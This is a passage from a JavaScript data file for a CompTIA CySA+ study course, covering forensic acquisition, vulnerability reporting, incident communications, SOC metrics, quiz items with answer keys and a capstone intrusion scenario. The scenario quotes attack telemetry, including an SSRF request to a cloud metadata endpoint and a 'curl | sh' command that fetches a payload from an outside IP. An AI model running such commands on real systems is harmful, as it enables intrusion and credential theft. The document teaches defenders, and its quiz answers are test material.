            'Maintain legal admissibility using bit-stream forensic imaging (`dd`/`FTK Imager`), write-blockers, SHA-256 integrity hashes, and unbroken Chain of Custody logs.',
            'Handle Legal Hold and Attorney-Client Privilege during high-stakes breach investigations.',
            'Apply Root Cause Analysis (5 Whys, Timeline Reconstruction) to distinguish superficial symptoms from systemic failure causes.',
          ],
          coreConcepts: [
            {
              heading: 'RFC 3227 Order of Volatility (Memorize This Sequence!)',
              explanation:
                'Forensic investigators ALWAYS collect evidence from MOST volatile (vanishes in microseconds/seconds) to LEAST volatile (persists for years): (1) CPU Registers & Cache -> (2) Routing Tables, ARP Cache, Process Table, Kernel Stats, System Memory (RAM) -> (3) Temporary File Systems & Swap Space -> (4) Hard Disk / SSD Data (bit-stream image via write-blocker) -> (5) Remote Logging & Monitoring Data -> (6) Physical Configuration & Network Topology -> (7) Archival Media (tapes, cold backups, printouts).',
              mentalModel:
                'Catching melting ice before stone statues: Grab RAM and live network state FIRST before they evaporate; take the disk image and backup tapes afterward.',
              formulaOrRule:
                'Order of Volatility: Registers/Cache -> RAM & Live Network/Process State -> Swap/Temp -> Disk -> Remote Logs -> Archival Media.',
            },
            {
              heading: 'Forensic Integrity: Write-Blockers, Bit-Stream Images, Hashing & Chain of Custody',
              explanation:
                'Never analyze live original media directly! Connect drives through a Hardware Write-Blocker, create a bit-for-bit forensic image (`dd`, `FTK Imager`, `EnCase`) capturing slack and unallocated space, and compute a cryptographic hash (SHA-256) of BOTH the original media and the forensic copy to prove mathematical identity. Document every single physical or digital handoff in the Chain of Custody log (WHO handled it, WHAT item/hash, WHEN date/time UTC, WHERE stored, WHY accessed). Any undocumented gap can make critical evidence inadmissible in court.',
              mentalModel:
                'Crime-scene DNA bag: Seal it tamper-evident (SHA-256 hash), never contaminate the original (work ONLY on a verified copy via write-blocker), and sign every handoff on the clipboard (Chain of Custody).',
              formulaOrRule:
                'Admissible Forensic Rule: Write-Blocker -> Bit-Stream Image -> SHA-256 Hash Match -> Work ONLY on Working Copy -> Complete Chain of Custody.',
            },
            {
              heading: 'Legal Hold, Attorney-Client Privilege & Root Cause Analysis',
              explanation:
                'When litigation or regulatory inquiry is foreseeable, Legal issues a Legal Hold suspending automated log purging, email deletion, and drive recycling across relevant custodians. To shield sensitive forensic drafts under Attorney-Client Privilege / Work-Product Doctrine, outside Legal Counsel—NOT IT—should contract external DFIR firms directly. Finally, Root Cause Analysis (e.g., 5 Whys) digs past "Bob clicked a phishing link" to systemic fixes ("No phishing-resistant MFA + unrestricted outbound PowerShell + local admin rights on user endpoints").',
              mentalModel:
                'Symptom = fever (user clicked link); Root Cause = bacterial infection (no FIDO2 MFA, no macro blocking, excessive user privileges).',
            },
          ],
          realWorldScenario: {
            title: 'The Thrown-Out Insider Theft Evidence',
            situation:
              'An engineer suspects a departing VP copied proprietary source code to a USB drive. The engineer boots the VP’s laptop directly into Windows, copies suspicious logs onto a spare thumb drive, and hands it to HR without hashing or logging custody. When the company sues, opposing counsel moves to exclude the evidence.',
            analysis:
              'Booting the laptop directly modified hundreds of OS timestamps, registry keys, and pagefiles—permanently tainting the original disk. Skipping a write-blocker, bit-stream image, SHA-256 hash, and Chain of Custody destroyed evidentiary integrity. Correct procedure: capture RAM if running, image the drive via hardware write-blocker, compute SHA-256 hashes, seal the original in an evidence locker, log custody, and analyze ONLY a verified forensic clone.',
            takeaway:
              'Technical brilliance means nothing in court if you contaminate the original media or break the Chain of Custody.',
          },
          examTraps: [
            'Trap: Collecting disk images or backup tapes BEFORE capturing RAM and live network/ARP caches. Always follow RFC 3227 Order of Volatility!',
            'Trap: Using MD5 alone when SHA-256 is offered as an option for modern cryptographic forensic integrity verification.',
            'Trap: Having the IT Director sign the external forensic retainer instead of Outside Legal Counsel when protecting Attorney-Client Privilege is the objective.',
          ],
          keyTerms: [
            {
              term: 'Order of Volatility (RFC 3227)',
              definition:
                'Standard forensic acquisition sequence prioritizing ephemeral evidence (CPU cache, RAM, network state) ahead of persistent disk and archival media.',
            },
            {
              term: 'Hardware Write-Blocker',
              definition:
                'Forensic device allowing read-only access to storage media so imaging cannot alter timestamps, metadata, or sectors on original evidence.',
            },
            {
              term: 'Chain of Custody',
              definition:
                'Chronological, unbroken audit trail documenting every individual who collected, transferred, stored, or analyzed an evidence item.',
            },
            {
              term: 'Legal Hold (Litigation Hold)',
              definition:
                'Formal directive suspending routine data retention purging or hardware wiping to preserve records relevant to anticipated legal proceedings.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d3-l2-q1',
              question:
                'A forensic analyst arrives at a live compromised Linux server. Applying RFC 3227 Order of Volatility, which artifact MUST be collected FIRST?',
              options: [
                'Full bit-stream image of the `/var` SSD partition',
                'Offsite monthly backup tapes',
                'System memory (RAM) and active network/ARP/process state',
                'Printed rack cabling topology diagram',
              ],
              correctIndex: 2,
              rationale:
                'System memory (RAM), active routing/ARP tables, and live process state vanish immediately upon reboot or activity and must be captured ahead of disk images and archival media.',
            },
            {
              id: 'cysa-d3-l2-q2',
              question:
                'After creating a bit-stream forensic image of a suspect laptop’s SSD using a hardware write-blocker, what step proves mathematically that the working copy has not been altered?',
              options: [
                'Comparing total file counts in Windows Explorer',
                'Generating and verifying matching cryptographic hashes (e.g., SHA-256) of the original drive and the forensic image',
                'Compressing the image into a password-protected ZIP file',
                'Booting the original SSD to verify the login screen still works',
              ],
              correctIndex: 1,
              rationale:
                'Matching cryptographic hashes (SHA-256) between original source media and the bit-stream copy provide mathematically verifiable proof of forensic integrity.',
            },
          ],
          practicalDrill: {
            title: 'Forensic Acquisition & 5-Whys RCA Walkthrough',
            prompt:
              'Document the exact acquisition sequence and 5-Whys Root Cause Analysis for a suspected insider exfiltration from a developer workstation.',
            steps: [
              'List 5 forensic collection steps in exact Order of Volatility (RAM -> Live Network/Processes -> Disk via Write-Blocker -> Cloud/SIEM logs -> Archival backups).',
              'Draft a sample Chain of Custody log entry with all 5 mandatory fields (Item ID, SHA-256 Hash, Custodian, UTC Timestamp, Purpose/Location).',
              'Run a 5-Whys chain starting from "Developer exfiltrated source code to personal Dropbox" until you reach 2 systemic control failures.',
              'Note how Legal Hold affects automated 30-day proxy log rotation.',
            ],
            successCriteria:
              'Zero order-of-volatility inversions, complete custody fields, Legal Hold enforced, and actionable systemic root causes.',
          },
          flashcards: [
            {
              front: 'Recite RFC 3227 Order of Volatility from MOST volatile to LEAST volatile.',
              back: 'CPU Registers/Cache -> RAM & Routing/ARP/Process Tables -> Swap/Temp Files -> Disk -> Remote Logs -> Physical Config -> Archival Media.',
              tag: 'CYSA-D3',
            },
            {
              front: 'Why should external DFIR firms be retained by outside Legal Counsel during a major breach?',
              back: 'To maximize protection of forensic drafts and investigative communications under Attorney-Client Privilege and Work-Product Doctrine.',
              tag: 'CYSA-D3',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
            'my_documents/cybersecurity-incident-management-guide-EN.pdf',
          ],
        },
      ],
    },

    // =================================================================
    // DOMAIN 4: Reporting and Communication (17%)
    // =================================================================
    {
      id: 'cysa-d4',
      domainNumber: 4,
      title: 'Reporting and Communication',
      examWeightPercent: 17,
      overview:
        'Bridges technical SOC/vulnerability operations with leadership, regulators, and engineering teams—covering vulnerability reporting, remediation SLAs, operational friction inhibitors, incident communications, and executive metrics (MTTD/MTTR/KRIs).',
      lessons: [
        {
          id: 'cysa-d4-l1',
          title: 'Vulnerability Reporting, Remediation SLAs & Overcoming Inhibitors',
          estimatedMinutes: 40,
          summary:
            'Craft audience-tailored vulnerability reports, enforce risk-tiered remediation SLAs, and diagnose real-world remediation inhibitors (legacy dependencies, proprietary code, MOUs/SLAs, organizational governance).',
          learningObjectives: [
            'Tailor vulnerability reports for three distinct audiences: Executive Leadership, Technical System Owners, and Compliance Auditors.',
            'Structure risk-tiered Remediation SLAs (Critical/KEV vs. High vs. Medium vs. Low) and exception workflows.',
            'Diagnose and resolve common Remediation Inhibitors: legacy systems, proprietary/end-of-life software, business uptime SLAs, and change-management bottlenecks.',
          ],
          coreConcepts: [
            {
              heading: 'Audience-Tailored Vulnerability Reporting',
              explanation:
                'Sending a 900-page Nessus CSV export to a CEO or sending a vague "security score is C+" slide to a Linux admin fails both audiences. Effective reporting uses three lenses:\n• Executive Report (1–2 pages): Risk trend over time, SLA compliance rate, top business-critical exposures, and funding/policy bottlenecks.\n• Technical Action Report (Jira/Ticket): Exact affected asset/IP/hostname, CVE/CVSS/KEV rating, verified proof-of-concept/package version, exact remediation command/patch KB, and SLA due date.\n• Compliance Report: Framework control mapping (PCI DSS 11.3, HIPAA, SOC 2), clean quarterly ASV scan attestations, and formally signed risk exceptions.',
              mentalModel:
                'Same X-ray, different conversations: The surgeon gets millimeter coordinates (Technical); the patient gets recovery timeline and trade-offs (Executive); the insurer gets billing codes (Compliance).',
            },
            {
              heading: 'Remediation Inhibitors & Compensating Strategies',
              explanation:
                'CySA+ CS0-003 explicitly tests organizational "Inhibitors to Remediation"—real reasons teams cannot just click "Install Patch":\n• Legacy / End-of-Life (EOL) Systems: Vendor no longer issues patches -> Isolate on segmented VLAN, apply strict firewall ACLs, plan decommission.\n• Proprietary / Custom Applications: Upgrading runtime libraries breaks mission-critical code -> Deploy virtual patching (WAF) and work with Dev on refactored release.\n• Service Level Agreements (SLAs) / Peak Business Windows: Rebooting violates 99.99% contractual uptime -> Schedule rolling blue/green patching or temporary compensating control.\n• Organizational Governance / Degraded Functionality: Fear of outage without staging test environments -> Establish staged canary testing and formal CAB exception tracking.',
              mentalModel:
                'Never yell "just patch it!" at an operations team—diagnose the exact inhibitor and pair a short-term compensating control with a dated permanent fix.',
              formulaOrRule:
                'Typical Risk-Based Patch SLA Tiers: Active KEV = 24–72h | Critical = 7–15d | High = 30d | Medium = 60–90d | Low = 180d/Best Effort.',
            },
          ],
          realWorldScenario: {
            title: 'Resolving a Deadlock Over an EOL Warehouse Database',
            situation:
              'Vulnerability Management flags 14 Critical CVEs on a Windows Server 2012 R2 (End-of-Life) server running a proprietary warehouse forklift-dispatch system. Operations refuses to upgrade because the vendor went out of business and downtime halts $3M/day in shipments.',
            analysis:
              'The remediation inhibitors are Legacy EOL OS + Proprietary Software + High-Availability Operational Constraints. Escalating angrily accomplishes nothing. The CySA+ analyst drafts a formal time-bound Risk Exception approved by the VP of Supply Chain, moves the server onto an isolated zero-internet VLAN allowing only port 443 from specific warehouse terminals, enforces application allowlisting/EDR, and secures budget for a 6-month migration onto a supported platform.',
            takeaway:
              'Great security analysts solve business constraints with layered compensating controls and dated retirement plans—not ultimatums.',
          },
          examTraps: [
            'Trap: Including raw scanner packet dumps or 400 CVE IDs in an Executive Summary. Executives want risk trends, SLA compliance, business impact, and strategic blockers.',
            'Trap: Ignoring "MOU/SLA" or "Proprietary System" hints in exam questions. When an app cannot be patched immediately due to vendor/SLA restrictions, look for segmentation, virtual patching, and formal risk acceptance.',
          ],
          keyTerms: [
            {
              term: 'Remediation Inhibitor',
              definition:
                'Technical, contractual, or organizational constraint (e.g., EOL software, uptime SLA, proprietary dependency) that prevents immediate patching.',
            },
            {
              term: 'ASV (Approved Scanning Vendor)',
              definition:
                'PCI SSC-certified organization authorized to perform mandatory quarterly external PCI DSS compliance vulnerability scans.',
            },
            {
              term: 'SLA Compliance Rate',
              definition:
                'Percentage of vulnerabilities remediated within their severity-defined target window (e.g., 94% of Critical flaws patched within 15 days).',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d4-l1-q1',
              question:
                'A quarterly vulnerability report is being prepared for the Board Audit Committee. Which combination of elements is MOST appropriate?',
              options: [
                'Full raw Nmap XML output and individual Linux package changelogs',
                'Remediation SLA trend lines, count of overdue Critical/KEV exposures on Tier-1 business apps, and top funding/legacy blockers',
                'Copy-pasted exploit payloads from Exploit-DB for each CVE',
                'Individual analyst shift schedules and SIEM CPU utilization',
              ],
              correctIndex: 1,
              rationale:
                'Executive/Board reporting translates vulnerability posture into business risk trends, SLA adherence on critical assets, and strategic decisions required.',
            },
            {
              id: 'cysa-d4-l1-q2',
              question:
                'A mission-critical manufacturing scheduling app runs on an End-of-Life operating system that cannot be upgraded for 9 months without halting production. What is the BEST CySA+ course of action?',
              options: [
                'Delete the server from the vulnerability scanner asset group to keep metrics green',
                'Apply compensating controls (strict VLAN microsegmentation, allowlisting, enhanced monitoring), document a time-bound risk exception signed by the business owner, and track a migration plan',
                'Immediately shut down the server during business hours to enforce compliance',
                'Install an unverified third-party community kernel patch directly in production',
              ],
              correctIndex: 1,
              rationale:
                'Combining compensating controls, executive risk acceptance with an expiration date, and a tracked migration roadmap manages risk responsibly without halting revenue or hiding exposure.',
            },
          ],
          practicalDrill: {
            title: 'Write Dual-Audience Vulnerability Briefs',
            prompt:
              'Take one verified critical Apache Log4j/RCE finding on a public portal and write two targeted summaries.',
            steps: [
              'Draft a 4-line Technical Ticket for the WebOps engineer (Asset, CVE/CVSS/KEV, verified version, exact patch/WAF action, 48h SLA).',
              'Draft a 4-line Executive Update for the VP of Engineering (Business exposure, customer impact if exploited, mitigation status, decision needed).',
              'List two realistic remediation inhibitors and the exact compensating control for each.',
            ],
            successCriteria:
              'Zero audience mismatch—engineer gets actionable precision; executive gets business impact and decision clarity.',
          },
          flashcards: [
            {
              front: 'Name four common Remediation Inhibitors tested on CompTIA CySA+ CS0-003.',
              back: 'Legacy/EOL systems, Proprietary/custom software dependencies, Uptime/contractual SLAs (MOU/SLA), and Degraded functionality / business governance constraints.',
              tag: 'CYSA-D4',
            },
            {
              front: 'What distinguishes a Technical Vulnerability Report from an Executive Vulnerability Report?',
              back: 'Technical reports give asset-level CVEs, proof, exact patch steps, and due dates; Executive reports show SLA trends, business-critical risk posture, and strategic blockers.',
              tag: 'CYSA-D4',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
          ],
        },
        {
          id: 'cysa-d4-l2',
          title: 'Incident Communications, Breach Notification & SOC Performance Metrics',
          estimatedMinutes: 40,
          summary:
            'Coordinate high-pressure incident communications across Legal, PR, Law Enforcement, and Regulators without causing legal prejudice, while tracking core SOC KPIs/KRIs (MTTD, MTTA, MTTR, False Positive Rate).',
          learningObjectives: [
            'Map exact stakeholder communication roles during a severe cyber incident (Legal, PR/Comms, HR, Law Enforcement, Regulators, Customers, Cyber Insurer).',
            'Enforce strict Communication Hygiene: stick to verified facts, avoid speculation/blame, protect legal privilege, and prevent premature public disclosure.',
            'Calculate and interpret SOC/IR operational metrics: MTTD, MTTA, MTTC, MTTR, Dwell Time, and Alert False Positive Rate.',
          ],
          coreConcepts: [
            {
              heading: 'Incident Stakeholder Communication Governance',
              explanation:
                'Technical analysts MUST NEVER contact journalists, regulators, or customers directly. Under a formal Incident Communication Plan:\n• Legal Counsel determines statutory breach notification triggers (GDPR 72h, HIPAA 60d, SEC 4-business-day material incident Form 8-K, state laws) and oversees law enforcement referrals (FBI/CISA/NCSC).\n• Public Relations / Corporate Comms crafts vetted external customer and media statements to avoid unverified speculation.\n• Cyber Insurance Carrier must be notified promptly per policy terms (often requiring pre-approved panel DFIR/breach counsel to preserve coverage!).\n• HR handles insider-threat personnel actions safely.',
              mentalModel:
                'Single-voice discipline: Analysts supply verified facts to the Incident Commander; Legal and PR translate those facts for the outside world.',
              formulaOrRule:
                'Incident Comms Golden Rule: Report ONLY verified facts—NEVER speculate on attribution, root cause, or affected record counts in emails or chat.',
            },
            {
              heading: 'Core SOC & IR Operational Metrics (Know Every Acronym!)',
              explanation:
                'Leadership measures security operations effectiveness using time-based lifecycle metrics:\n• Dwell Time: Total time an adversary lurks undetected inside the environment (Initial Compromise -> Detection).\n• MTTD (Mean Time to Detect): Average elapsed time from attack start to alert/detection.\n• MTTA (Mean Time to Acknowledge): Average time from alert firing until an analyst opens/claims it.\n• MTTC (Mean Time to Contain): Average time from detection until threat spread is halted.\n• MTTR (Mean Time to Respond / Remediate / Recover): Average total time from detection to full containment/remediation/service restoration.\n• False Positive Rate & Escalation Rate: Measures SIEM detection rule precision vs. analyst noise.',
              mentalModel:
                'House fire stopwatch: Dwell Time/MTTD = smoke starts until alarm rings; MTTA = alarm rings until fire crew answers; MTTC = hose stops fire spreading; MTTR = fire out and home restored.',
              formulaOrRule:
                'Timeline Chain: Initial Compromise --[MTTD/Dwell]--> Alert --[MTTA]--> Triage --[MTTC]--> Contained --[MTTR]--> Fully Remediated.',
            },
          ],
          realWorldScenario: {
            title: 'The Slack Speculation That Cost $4 Million in Discovery',
            situation:
              'Two hours into investigating a suspected database intrusion, a SOC analyst posts in a company-wide Slack channel: "Looks like Russian APT stole all 2 million customer SSNs because DevOps ignored my ticket last month—we’re totally breached!" Later forensics proves only 140 test accounts were exposed.',
            analysis:
              'Three major communication failures occurred: (1) posting unverified speculation ("Russian APT", "all 2 million SSNs") in a discoverable non-privileged chat channel; (2) assigning blame prematurely; and (3) violating need-to-know / OOB incident comms protocols. During litigation, opposing lawyers subpoena that Slack message as damaging evidence of negligence.',
            takeaway:
              'Inside an active incident, write every chat message and ticket note as if it will be projected on a courtroom screen in 18 months: objective, factual, timestamped, zero speculation.',
          },
          examTraps: [
            'Trap: Choosing "SOC Analyst notifies affected customers immediately upon seeing suspicious SQL logs." Notification requires verified confirmation, Legal Counsel approval, and PR coordination.',
            'Trap: Confusing MTTD (time until detected) with MTTA (time from alert until analyst acknowledges) or MTTR (time to fully remediate/recover).',
            'Trap: Hiring a non-panel DFIR firm before calling the Cyber Insurance carrier, risking denial of claim reimbursement.',
          ],
          keyTerms: [
            {
              term: 'Dwell Time',
              definition:
                'Duration between an attacker’s initial unauthorized compromise and the defender’s first detection of the intrusion.',
            },
            {
              term: 'MTTD (Mean Time to Detect)',
              definition:
                'Average elapsed time required for monitoring controls and analysts to identify a security incident after it begins.',
            },
            {
              term: 'MTTR (Mean Time to Respond / Remediate)',
              definition:
                'Average time required to contain, eradicate, and restore systems following incident detection.',
            },
            {
              term: 'MTTA (Mean Time to Acknowledge)',
              definition:
                'Average elapsed time from alert generation until a SOC analyst picks up and begins triaging the alert.',
            },
          ],
          conceptChecks: [
            {
              id: 'cysa-d4-l2-q1',
              question:
                'A SOC’s SIEM triggers alerts within 2 minutes of an attack, but alerts sit unassigned in the queue for an average of 4 hours before an analyst begins triage due to excessive noisy rules. Which metric is MOST severely degraded?',
              options: [
                'Mean Time to Acknowledge (MTTA)',
                'Mean Time Between Failures (MTBF)',
                'Recovery Point Objective (RPO)',
                'Single Loss Expectancy (SLE)',
              ],
              correctIndex: 0,
              rationale:
                'MTTA measures the lag between alert creation and an analyst picking up/acknowledging the ticket. High alert fatigue and false positives directly inflate MTTA.',
            },
            {
              id: 'cysa-d4-l2-q2',
              question:
                'Mid-investigation of a potential customer data exfiltration, a journalist emails a SOC analyst requesting comment. What MUST the analyst do?',
              options: [
                'Confirm the attack briefly so the company appears transparent',
                'Say "no breach occurred" to protect the stock price',
                'Do not comment; immediately escalate the inquiry to Corporate Communications / PR and Legal Counsel per the Incident Communication Plan',
                'Share anonymized SIEM screenshots showing containment is underway',
              ],
              correctIndex: 2,
              rationale:
                'Analysts never speak to external media directly. All external press/regulator statements must flow through authorized Corporate PR and Legal Counsel.',
            },
          ],
          practicalDrill: {
            title: 'Incident Communication Matrix & Metric Calculation',
            prompt:
              'Calculate core SOC metrics from a real incident timeline and assign stakeholder notifications.',
            steps: [
              'Given: Initial phish & beacon = Mon 09:00; SIEM Alert = Tue 09:00; Analyst Opens Ticket = Tue 09:30; Host Isolated = Tue 10:15; Full Eradication & Restore = Tue 17:00. Compute Dwell Time/MTTD, MTTA, MTTC, and MTTR.',
              'Assign who notifies: (a) Regulators, (b) Affected Customers, (c) Cyber Insurer, (d) Law Enforcement.',
              'Rewrite this bad analyst note into courtroom-safe factual language: "DevOps left port 22 wide open again so hackers definitely dumped the whole DB."',
            ],
            successCriteria:
              'Exact metric math (Dwell/MTTD = 24h, MTTA = 30m, MTTC = 1h 15m from alert, MTTR = 8h from alert), proper Legal/PR routing, and strictly objective factual rewrite.',
          },
          flashcards: [
            {
              front: 'Contrast MTTD, MTTA, MTTC, and MTTR.',
              back: 'MTTD = compromise to detection; MTTA = alert to analyst pickup; MTTC = detection to containment; MTTR = detection to full remediation/recovery.',
              tag: 'CYSA-D4',
            },
            {
              front: 'What is the #1 rule for analyst notes and chat messages during an active security incident?',
              back: 'Document ONLY verified, objective, timestamped facts—never speculate on attribution, blame, or unconfirmed breach scope.',
              tag: 'CYSA-D4',
            },
          ],
          sourceRefs: [
            'my_documents/Chapple M. CompTIA CySA+ Practice Tests. Exam CS0-003 3ed 2023.pdf',
            'my_documents/cybersecurity-incident-management-guide-EN.pdf',
          ],
        },
      ],
    },
  ],
  capstone: {
    title: 'Capstone: Full-Spectrum Intrusion Triage, Prioritization & Recovery at NovaRetail',
    scenario:
      'At 03:20 UTC, NovaRetail’s SOC receives three correlated signals: (1) Nginx logs on an internet-facing e-commerce API (`10.10.2.15`) show `POST /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-api-role 200 1380`; (2) EDR on a build server (`10.10.8.40`) flags `jenkins` spawning `/bin/sh -c "curl http://185.220.101.9/stage2.sh | sh"` followed by outbound DNS TXT queries to 52-character hex subdomains under `telemetry-cdn.xyz`; (3) Simultaneously, your weekly vulnerability scan drops 4 critical CVEs including an unpatched VPN gateway CVE (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, CISA KEV=Yes, EPSS=92%) and an EOL warehouse database that cannot be patched for 6 months.',
    tasks: [
      'Diagnose EVERY active attack technique across the Nginx log, EDR process tree, and DNS telemetry, mapping each to MITRE ATT&CK and explaining what the attacker achieved.',
      'Execute a prioritized NIST SP 800-61 Containment & Eradication plan (including cloud IAM revocation, host isolation without losing RAM, OOB comms, and closing SSRF/IMDSv2).',
      'Specify exact RFC 3227 Order of Volatility forensic steps and Chain of Custody safeguards for the compromised build server.',
      'Prioritize the VPN KEV flaw vs. the EOL warehouse server, specifying immediate remediation for the VPN and compensating controls + exception governance for the EOL server.',
      'Draft a crisp 5-bullet Executive & Legal Incident Brief adhering to factual communication hygiene and identifying regulatory/cyber-insurance escalation triggers.',
    ],
    modelSolution:
      '1) Attack Diagnosis: (a) Nginx log proves confirmed SSRF exploitation against AWS IMDSv1 (HTTP 200, 1380 bytes) stealing temporary IAM role credentials (`shop-api-role` — MITRE T1552.005 Cloud Instance Metadata API); (b) Build server shows RCE/compromised CI/CD pipeline (`jenkins -> /bin/sh -> curl|sh` — T1059 Command & Scripting Interpreter) downloading a second-stage payload; (c) High-entropy hex subdomains via DNS TXT queries indicate active DNS Tunneling C2/exfiltration (T1071.004).\n2) Containment & Eradication: Activate Out-of-Band (OOB) IR comms. Immediately revoke active STS sessions for `shop-api-role` and audit AWS CloudTrail for unauthorized IAM/S3 actions; enforce IMDSv2 on EC2 instances and block `169.254.169.254` in the API egress allowlist. Isolate `10.10.8.40` via EDR network quarantine (keep powered on for RAM capture!) and DNS-sinkhole `telemetry-cdn.xyz`. During Eradication, rotate all CI/CD build secrets/SSH keys/signing certs, rebuild the build server from a clean golden image, and audit recent build artifacts for supply-chain tampering.\n3) Forensics: Follow RFC 3227 strictly—capture RAM and live network/process tables FIRST on `10.10.8.40`, then create a bit-stream disk image via write-blocker, compute matching SHA-256 hashes, record unbroken Chain of Custody, and issue a Legal Hold on AWS CloudTrail and DNS logs.\n4) Vulnerability Prioritization: Patch the internet-facing VPN CVE IMMEDIATELY (emergency window <24h) because it is `AV:N/PR:N/UI:N/S:C`, internet-exposed, KEV-listed, and 92% EPSS. For the EOL warehouse server (legacy inhibitor), isolate it on a strictly firewalled micro-VLAN, deploy allowlisting/EDR, obtain a time-bound business-owner risk exception, and track a funded migration plan.\n5) Executive/Legal Brief: Present strictly verified facts (affected systems, confirmed IAM credential exposure, containment status, ongoing CloudTrail scope review, zero speculation on threat actor attribution), trigger outside Legal Counsel for regulatory breach clock assessment and prompt Cyber Insurance panel notification.',
  },
  examStrategy: {
    examFormat:
      'CompTIA CySA+ CS0-003: Up to 85 questions (multiple-choice + 3–5 interactive Performance-Based Questions / PBQs) in 165 minutes. Passing score: 750 / 900.',
    timeManagementPlan:
      'Skip the PBQs at minute 0 by flagging them and returning after MCQs (leaving ~35–40 minutes at the end for PBQs). Pace MCQs at ~90 seconds each (~110 minutes for ~78 MCQs), leaving 15 minutes for final flagged review.',
    mindsetRules: [
      'Read Logs Backwards-In: Check HTTP Status Code + Response Size FIRST to tell whether an attack failed (403/404) or succeeded (200 + big payload).',
      'Decode CVSS Vectors Mechanically: `AV:N + AC:L + PR:N + UI:N` on an internet-facing asset with KEV/high EPSS ALWAYS wins remediation priority.',
      'Protect Volatile Evidence: When forensics/prosecution is mentioned, isolate network—NEVER pull the power plug before RAM capture.',
      'Fix Root Cause, Not Symptoms: SQLi = Parameterized Queries; XSS = Output Encoding + CSP; SSRF/Cloud = IMDSv2 + Egress Allowlist; BOLA/IDOR = Server-Side Authorization.',
      'Respect Business Constraints: For legacy/EOL/OT systems, choose Passive Scanning and Layered Compensating Controls + Risk Exception over destructive shutdowns.',
      'Stay in Your Lane on Comms: Analysts report verified facts internally; Legal and PR handle regulators, media, and customer breach notices.',
    ],
    finalWeekChecklist: [
      'Drill decoding 15 CVSS v3.1 vector strings until you translate every letter (`AV/AC/PR/UI/S/C/I/A`) in under 10 seconds.',
      'Practice spotting SQLi, XSS, Directory Traversal (`%2e%2e%2f`), Command Injection, SSRF (`169.254.169.254`), and Web Shells (`w3wp.exe -> cmd.exe`) in raw logs.',
      'Memorize RFC 3227 Order of Volatility, NIST SP 800-61 phases, TLP 2.0 levels, and STIX vs. TAXII.',
      'Review SAST vs. DAST vs. SCA vs. IAST and key Nmap flags (`-sS`, `-sT`, `-sU`, `-sV`, `-O`, `-Pn`).',
      'Complete at least two full timed 85-question CS0-003 practice exams from Mike Chapple’s CS0-003 book in `my_documents/` scoring >=85%.',
    ],
  },
};
